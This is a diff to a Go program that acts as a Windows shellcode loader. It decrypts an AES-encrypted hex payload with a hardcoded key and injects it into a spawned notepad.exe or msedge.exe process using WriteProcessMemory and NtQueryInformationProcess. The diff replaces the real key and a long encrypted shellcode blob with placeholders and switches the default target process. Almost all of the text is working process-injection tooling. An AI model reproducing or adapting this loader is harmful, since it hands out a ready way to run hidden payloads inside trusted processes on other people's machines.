@@ -31,8 +31,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// We learned quite a bit from this post http://stackoverflow.com/questions/18817336/golang-encrypting-a-string-with-aes-and-base64 (Intermernet's answer)
-
 // IsEncryptionOn : A simple system for turning on and off encryption in case you need to see the plain text results in a database for testing (default is On)
 var IsEncryptionOn = true
 
@@ -87,11 +85,11 @@ var s []byte
 func main() {
 	fmt.Println("Starting encryption.")
 
-	key := "c8uDUFabg(ndMVK#%e3NfTPLtEzA5G$&" //32 chars long
+	key := "PLACE-KEY-HERE" //32 chars long
 	fmt.Println("Key = %s.", key)
 
 	Use(s)
-	encodedString2, _ := hex.DecodeString("21fbd4fbc30b3228162dea10728b57d5d92c8a387104a1492e80f64caf7fbe11f41bbf5f2b5b03c205773f9ad69ba8f21e58bdf65f02044a03d74b779e21764848385333ab74a2e9df968fc3cfdade69d9cbe131183fae9c4c486699a51507abcd5e1a298e12782f7d13faedf2003832060bd4002e46f354498b7594c17a87d9bf76b797249689c98bd748372cf1d238da679ad3ec682cd1322da89b6a05f22bc370c9357a39c36846f79c4420809ca8f98eba550efb2d900d5f7a44816e2e3d8cb9f351e329ba33951ff5ba86be910a79bb5789355c80f1133c6bf6dabe688de401da5c31d34ac0d602c917482ea00232f1c545640395203778c5138869beb5495b1572eab1e90d9493d1bd557a67e1a93eed3f9a6c19d00f2d4f082a13e68db9f9880bbd66de976d7ae0820f8aa4cbc49e272f1454e21a9ee932f67b5300cdedb2f848fb615fafd5d2a1db5e4985a28c1cae077889e04b0743f3fdfb26278ad0459804393ea3808fd6a7b4b1bd24387f8f67469c1684fe3537815da87a76d0d64a17b3502981d466e6767534f866b7b828668fd6d6f7717a7e25542f44aad796a347e1fbf44383861b6ae4320f4df08c48dd7f1b9b594d67c2eaa40a2eeb83713483bba4e7a7528bfe67e64356405fed1188f899cc5b3e18115615")
+	encodedString2, _ := hex.DecodeString("PLACE-SHELLCODE-HERE")
 	shellcode, err := DecryptByteArray([]byte(key), encodedString2)
 
 	if err != nil {
@@ -107,8 +105,8 @@ func main() {
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
 
-	//program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "The program to start and inject shellcode into")
-	program := flag.String("program", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "The program to start and inject shellcode into")
+	program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "The program to start and inject shellcode into")
+	//program := flag.String("program", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "The program to start and inject shellcode into")
 
 	procInfo := &windows.ProcessInformation{}
 	startupInfo := &windows.StartupInfo{
